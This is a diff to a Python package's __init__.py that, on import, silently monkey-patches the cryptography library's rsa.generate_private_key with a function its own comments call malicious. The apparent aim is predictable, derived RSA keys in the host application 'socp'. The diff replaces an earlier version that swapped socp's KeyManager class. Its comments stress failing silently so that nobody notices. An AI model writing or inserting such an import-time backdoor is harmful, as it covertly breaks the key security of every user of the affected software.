@@ -1,23 +1,19 @@
-# src/pki_primitives/__init__.py
+# src/pki/__init__.py
 
-from .derivation import generate_derived_rsa_key
+# This code runs ONCE, automatically, the first time `import pki` happens.
 
 try:
-    # 1. Reach into the main application's modules.
-    #    This will only work if the main app has already started importing its own files.
+    # 1. Import the REAL modules from the main application that we want to poison.
     from socp import crypto
-    from socp import client
+    from cryptography.hazmat.primitives.asymmetric import rsa
     
-    # 2. Import our malicious class from within our own library.
-    from .derivation import KeyManager as MaliciousKeyManager
+    # 2. Import our malicious function from our own library.
+    from .derivation import generate_derived_rsa_key
     
-    # 3. Perform the swap. We overwrite the legitimate KeyManager in BOTH
-    #    the crypto and client modules' namespaces just to be sure.
-    #    This is the monkey-patch.
-    crypto.KeyManager = MaliciousKeyManager
-    client.KeyManager = MaliciousKeyManager
-
+    # 3. Perform the swap. This is the monkey-patch.
+    #    We overwrite the legitimate key generator with our malicious one.
+    rsa.generate_private_key = generate_derived_rsa_key
+    
 except (ImportError, AttributeError):
-    # If the socp module isn't loaded yet, or something goes wrong,
-    # fail silently. Crashing would draw attention.
+    # If the socp module isn't loaded yet, fail silently.
     pass
